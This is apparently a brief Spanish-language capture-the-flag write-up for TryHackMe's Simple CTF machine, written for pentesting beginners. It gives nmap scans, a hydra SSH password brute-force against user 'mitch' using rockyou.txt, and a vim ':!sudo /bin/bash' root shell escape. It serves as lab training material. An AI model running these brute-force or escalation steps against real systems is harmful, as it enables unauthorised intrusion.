# WriteUp-SimpleCTF
Informe detallado para iniciar en pentesting, en este caso maquina Simple CTF en TryHackMe

Antes de iniciar recordar tener activa la maquina, si no sabes como realizarlo tengo un repositorio con los pasos para realizar este proceso
Adicionalmente recomiendo realizar resolución de dominio en etc host con nano o vim
nmap de reconocimiento inicial
	nmap -p- [ip]

nmap, segundo scan pero con scripts (realizar con salida de archivo grepeable ideal para uso de datos)
	nmap -sC -sV -p(puertos) [ip]


para hacer hydra, considerar ubicación del diccionario, en este caso se toma referencia del diccinario rockyou.txt:
	hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.201.84.183:2222 
	
	
ahora el ejemplo de escalada de privilegios con vim, considerar que se hace en el apartado de ingreso de comandos, no creando archivo de algùn tipo:
	:!sudo /bin/bash
